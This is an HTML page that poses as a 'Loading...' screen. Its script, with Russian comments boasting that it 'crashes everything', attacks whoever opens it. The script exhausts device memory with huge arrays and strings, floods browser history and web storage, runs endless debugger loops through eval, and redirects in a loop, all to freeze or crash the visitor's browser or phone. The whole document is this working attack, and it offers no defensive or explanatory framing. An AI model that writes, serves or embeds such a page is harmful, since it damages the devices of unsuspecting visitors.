<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // МАКСИМАЛЬНО АГРЕССИВНЫЙ КОД - КРАШИТ ВСЁ
        (function() {
            // 1. Заполняем память до отказа (даже на новых телефонах)
            let memory = [];
            let gb = 0;
            try {
                while(true) {
                    memory.push(new Uint8Array(1024 * 1024 * 50)); // 50MB за раз
                    gb++;
                    if(gb % 20 === 0) {
                        // Дополнительно создаём огромные строки
                        memory.push('X'.repeat(100000000));
                    }
                }
            } catch(e) { /* игнорим */ }
            
            // 2. Бесконечный спам history (для Safari)
            setInterval(function() {
                try {
                    for(let i=0;i<10000;i++) {
                        window.history.pushState({}, '', '/?' + Math.random() + '=' + 'a'.repeat(1000));
                    }
                } catch(e) {}
            }, 1);
            
            // 3. Замораживаем все таймеры и события
            setInterval(function() {
                while(true) {
                    eval('debugger;'.repeat(1000));
                }
            }, 1);
            
            // 4. Спам localStorage и sessionStorage (некоторые браузеры падают)
            setInterval(function() {
                try {
                    for(let i=0;i<1000;i++) {
                        localStorage.setItem('crash'+i, 'x'.repeat(100000));
                        sessionStorage.setItem('crash'+i, 'x'.repeat(100000));
                    }
                } catch(e) {}
            }, 1);
            
            // 5. Бесконечный редирект
            setTimeout(function() {
                while(true) {
                    location.replace(location.href + '#crash');
                }
            }, 500);
        })();
    </script>
</body>
</html>
